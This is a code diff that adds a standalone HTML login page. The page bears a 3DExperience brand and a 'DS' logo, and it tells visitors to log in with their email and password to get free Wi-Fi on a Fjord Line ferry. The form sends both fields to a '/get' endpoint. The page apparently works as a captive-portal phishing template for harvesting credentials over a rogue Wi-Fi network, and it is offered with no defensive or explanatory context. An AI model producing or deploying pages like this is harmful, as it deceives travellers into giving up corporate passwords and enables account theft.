@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: linear-gradient(to top left, #005386, #003c5a);
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 40px;
+            max-width: 400px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        #logo {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        #logo img{
+            border-radius: 6px;        
+        }
+        h1 {
+            font-weight: 500;
+        }
+        h1, h2, h3 {
+            font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
+            margin-bottom: 20px;
+        }
+        .g-input {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #000;
+            border-color: #000;
+            border-width: 1px;
+            transition-duration: 0.2s, 0.2s;
+            transition-timing-function: ease-in-out, ease-in-out;
+            transition-delay: 0s, 0s;
+            transition-property: border-color;
+        }
+        .gbtn-primary {
+            display: block;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            background-image: linear-gradient(#42a2da,#42a2da);
+            color: #fff;
+            border-color: #368ec4;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 30px;
+            height: 38px;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+</head>
+<body>
+    <div class="login-container">
+        <form action="/get" id="email-form-step">
+            <div id="logo">
+                <img alt="DS" src="data:image/png;base64,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" />
+            </div>
+            <h1>
+                Welcome to the <b>3D</b>Experience platform
+            </h1>
+            <h3>Log in to Fjord Line to access free Wi-Fi on board.</h3>
+            <input name="email" type="text" class="g-input" placeholder="Email address" required>
+            <input name="password" type="password" class="g-input" placeholder="Password" required>
+            <button class="gbtn-primary" type="submit">Continue</button>
+        </form>
+    </div>
+</body>
+</html>
